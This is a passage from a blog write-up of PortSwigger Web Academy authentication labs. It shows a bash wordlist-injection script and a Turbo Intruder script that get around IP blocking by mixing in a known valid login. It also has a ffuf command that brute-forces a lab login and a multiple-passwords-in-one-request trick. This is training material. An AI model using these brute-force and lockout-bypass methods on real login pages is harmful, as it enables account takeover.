</pre></table></code></div></div><p><img data-src="/assets/images/670231072304ac87bf065668c71435e44d56ece1985dd8fb21b11e3739401aa5.png" alt="picture 54" data-proofer-ignore></p><p>Lab has been solved:</p><p><img data-src="/assets/images/55679382b3b1fb820555fa5f9ffddc91fa4a4e26a90ccd78eb281f05265b7ee3.png" alt="picture 53" data-proofer-ignore></p><h2 id="solution-2---using-burp-intruder-with-customized-username-and-password-lists">Solution #2 - Using Burp Intruder with customized username and password lists.<a href="#solution-2---using-burp-intruder-with-customized-username-and-password-lists" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This may be easier and faster as we only need to modify scripts in a ways that <code class="language-plaintext highlighter-rouge">wiener:peter</code> appear after 2nd brute-force attempt. Something like</p><ul><li>carlos:123456<li>carlos:123457<li>wiener:peter<li>carlos:234567<li>carlos:234568<li>wiener:peter<li>etc.</ul><p>This can be also done using python or bash, by reading file line by line and injecting on 3rd iteration. Mind that in the IF statement, we either output <code class="language-plaintext highlighter-rouge">carlos</code> or the actual entry in the username/password table.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="c"># there are no built in checks. Run as following:</span>
<span class="c"># ./custom_wordlist_inject.sh ./portswigger_usernames wiener 3</span>
<span class="c"># ./custom_wordlist_inject.sh &lt;wordlist&gt; &lt;either pass or username that we want to inject&gt; &lt;declare on how many cycles injected string should appear&gt;</span>
<span class="nv">bruteforce_list</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">injection_on</span><span class="o">=</span><span class="nv">$2</span>
<span class="nb">declare</span> <span class="nt">-i</span> <span class="nv">cycles</span><span class="o">=</span><span class="nv">$3</span>
<span class="nb">declare</span> <span class="nt">-i</span> <span class="nv">i</span><span class="o">=</span>0

<span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> line
<span class="k">do 
    </span><span class="nv">i</span><span class="o">=</span><span class="nv">$i</span>+1
    <span class="k">if</span> <span class="o">((</span><span class="nv">$i</span>&lt;<span class="nv">$cycles</span><span class="o">))</span>
    <span class="k">then</span>
        <span class="c">#for usernames only carlos should show as this is the user that is being brute-forced!. Reading the wordlist isn't really necessary for usernames but i'll let it be. Either commend out this line:</span>
        <span class="nb">echo</span> <span class="nv">$line</span>
        <span class="c"># or this line</span>
        <span class="c">#echo "carlos"</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="nv">$injection_on</span>
        <span class="nv">i</span><span class="o">=</span>0
    <span class="k">fi
done</span> &lt; <span class="nv">$bruteforce_list</span>
</pre></table></code></div></div><p>Result: <img data-src="/assets/images/158653a7fb3fd1b344f6378e25048e77d2907f6c274c12c4692273b51d44d278.png" alt="picture 57" data-proofer-ignore></p><p>We can see that on every 3rd iteration, login should theoreticaly succed. Script above can be piped into file to save it on disk!.</p><p>We can throw both lists to Burp Intruder now and use <code class="language-plaintext highlighter-rouge">Pitchfork</code> mode.</p><p><img data-src="/assets/images/7d83d48a648ad4651dc376f269701cd5b0c4f111299b0f0d3b19ff69e0f58403.png" alt="picture 59" data-proofer-ignore></p><p>Modify the <code class="language-plaintext highlighter-rouge">Resource pool</code> to <code class="language-plaintext highlighter-rouge">1</code> or we’ll get blocked</p><p><img data-src="/assets/images/fded7ad2c7d58557b1dfe686dd27dcbfbf0d5b5df31fc3c339ce9af0376a202b.png" alt="picture 58" data-proofer-ignore></p><p>… and bruteforce</p><p><img data-src="/assets/images/be31b3c5b863c343292a36f9c4ab0ea515e8b867db819c0490310794b2541cab.png" alt="picture 60" data-proofer-ignore></p><p>We’ve got the password = <code class="language-plaintext highlighter-rouge">mom</code>. (yes password changes everytime the lab restarts ;)).</p><h2 id="solution-3---brute-force-using-burp-turbo-intruder">Solution #3 - Brute-force using Burp Turbo Intruder<a href="#solution-3---brute-force-using-burp-turbo-intruder" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Simple Burp’s Intruder does not have any scripting possiblilties, but Burp’s Turbo Intruder does. After installing and enabling it, we just need to select our POST request and choose Turbo Intruder through right mouse click and going into Extensions.</p><p>This is how i’ve set it up:</p><p><img data-src="/assets/images/4de9f48c1e3af5f1cef9905a2238155d1b94cb4cf946836032af39cc35d7e4ab.png" alt="picture 62" data-proofer-ignore></p><p>Script:</p><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c1"># Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
</span><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span>
                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
                           <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
                           <span class="n">pipeline</span><span class="o">=</span><span class="bp">False</span>
                           <span class="p">)</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/Users/lukaosojnik/Downloads/pw'</span><span class="p">):</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
            <span class="c1"># do one free run
</span>            <span class="n">engine</span><span class="p">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="p">[</span><span class="s">"carlos"</span><span class="p">,</span> <span class="n">word</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()])</span>
        <span class="k">elif</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
            <span class="c1"># do one extra run and reset with valid credentials
</span>            <span class="n">engine</span><span class="p">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="p">[</span><span class="s">"carlos"</span><span class="p">,</span> <span class="n">word</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()])</span>
            <span class="n">engine</span><span class="p">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="p">[</span><span class="s">"wiener"</span><span class="p">,</span> <span class="s">"peter"</span><span class="p">])</span>
            <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>

<span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">interesting</span><span class="p">:</span>
        <span class="n">table</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>

</pre></table></code></div></div><p><img data-src="/assets/images/23550081d9a1cd3eafa016c52dd8595290be31b8b3c21799be6917fd3bf0f408.png" alt="picture 61" data-proofer-ignore></p><p>It would also be possible to use <code class="language-plaintext highlighter-rouge">@MatchStatus(302)</code>, which would only display responses with status code 302.</p><p>Reference: https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack</p><h1 id="username-enumeration-via-account-lock">Username enumeration via account lock</h1><p>This lab was done by <code class="language-plaintext highlighter-rouge">ffuf</code>. I used <code class="language-plaintext highlighter-rouge">head -n 10</code> command on the password list to make a list with 10 passwords. This list was looped through all usernames.</p><p><img data-src="/assets/images/6c5267a4484d16fde7b28f4354d2bf081814d8f0a84d8b371afc0197a17645b3.png" alt="picture 63" data-proofer-ignore></p><p>User <code class="language-plaintext highlighter-rouge">adam</code> stood out, so it was brute-forced again using whole password list.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf <span class="nt">-w</span> portswigger_passwords:FUZZ_PW <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-u</span> <span class="s2">"https://0a58009d041cd3f7c0ae1c7f007000a9.web-security-academy.net/login"</span> <span class="nt">-d</span> <span class="s2">"username=adam&amp;password=FUZZ_PW"</span> <span class="nt">--fs</span> 3049 <span class="nt">--fs</span> 3101 <span class="nt">-x</span> http://127.0.0.1:8080
</pre></table></code></div></div><p>Obviously there is a difference if password maches. Below the comparisson using Burp Comparer:</p><p><img data-src="/assets/images/2fcc656d531f93859dab30119e5a74cc6a6b7943e6b2472d73839d728faf56f0.png" alt="picture 65" data-proofer-ignore></p><p>Most probable password <code class="language-plaintext highlighter-rouge">dragon</code> has been found and Lab has been solved</p><p><img data-src="/assets/images/e83a27806f27f6161c2884b62bd03b08a9c8832a28409b7040f067bb1b981a8b.png" alt="picture 64" data-proofer-ignore></p><h1 id="broken-brute-force-protection-multiple-credentials-per-request">Broken brute-force protection, multiple credentials per request</h1><blockquote><p>This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos’s password, then access his account page Victim’s username: carlos Candidate passwords</p></blockquote><p>If web applications login mechanismus is broken and lets you authenticate using multiple passwords as one then that’s definately a security issue. This is exactle what the application in the lab is doing. Let’s check it out.</p><p><img data-src="/assets/images/a837169de77e63c94acd86b5ad3edb04189918189b5e78ce6797da39fc80ed58.png" alt="picture 66" data-proofer-ignore></p><p>When testing login, we can notice that now we’re dealing with JSON. Let’s try to include multiple passwords in the same Repeater request.</p><p><img data-src="/assets/images/97b41704edd0e4422296190b1128c31ec47e4f91ae519f09321321e3e499b8e9.png" alt="picture 67" data-proofer-ignore></p><p>Apparently we’ve succeded but we don’t know what the password is, but if we open the session in browser we see that we’ve succesfully finished the lab and that we’re login.</p><p><img data-src="/assets/images/76d301a8d16302697566158223b3d6702286aaf87c5aa928e76f2b86479f3f97.png" alt="picture 68" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/broken-authentication/'>Broken Authentication</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/web-application/" class="post-tag no-text-decoration" >Web Application</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Vulnerable Username-Password Authentication - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Vulnerable_Username_and_Password_Authentication-copy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnerable Username-Password Authentication - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/Vulnerable_Username_and_Password_Authentication-copy/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Vulnerable Username-Password Authentication - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Vulnerable_Username_and_Password_Authentication-copy/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Alternative_vulnerable_authentication_mechanismus/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Other vulnerable Authentication Mechanismus</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div><div class="card"> <a href="/posts/Multi_Factor_Authentication/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Multi-Factor Authentication (MFA)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div><div class="card"> <a href="/posts/Vulnerable_password_reset/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnerable Password Reset</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Multi_Factor_Authentication/" class="btn btn-outline-primary" prompt="Older"><p>Multi-Factor Authentication (MFA)</p></a> <a href="/posts/Vulnerable_password_reset/" class="btn btn-outline-primary" prompt="Newer"><p>Vulnerable Password Reset</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
